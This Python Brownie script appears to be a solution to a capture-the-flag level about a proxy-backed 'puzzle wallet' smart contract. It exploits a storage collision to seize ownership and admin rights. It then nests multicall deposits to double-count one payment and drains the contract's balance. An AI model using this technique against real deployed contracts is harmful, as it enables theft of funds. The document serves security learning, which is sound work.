from scripts.helpful_scripts import get_account
from brownie import interface


def main():
    account = get_account()
    proxy = interface.PuzzleProxy("0x26727B24b4B2F125Ec003c4cc2b095C0E96a10f4")
    puzzle_proxy = interface.PuzzleWallet("0x26727B24b4B2F125Ec003c4cc2b095C0E96a10f4")

    print(f"Current owner is: {puzzle_proxy.owner()}")
    proxy.proposeNewAdmin(account, {"from": account})
    print(f"Owner is now: {puzzle_proxy.owner()}")

    puzzle_proxy.addToWhitelist(account, {"from": account})
    print(f"Whitelist status: {puzzle_proxy.whitelisted(account)}")

    amount_in_contract = puzzle_proxy.balance()

    deposit_data = puzzle_proxy.deposit.encode_input()
    multicall_data = puzzle_proxy.multicall.encode_input([deposit_data])
    execute_data = puzzle_proxy.execute.encode_input(
        account, amount_in_contract * 2, ""
    )

    payload = [deposit_data, multicall_data, execute_data]

    print(f"Contract balance before: {puzzle_proxy.balance()}")
    puzzle_proxy.multicall(payload, {"from": account, "value": amount_in_contract})
    print(f"Contract balance after:  {puzzle_proxy.balance()}")

    puzzle_proxy.setMaxBalance(account.address, {"from": account})

    print(f"""Level: {"PASSED" if proxy.admin() == account.address else "FAILED"}""")
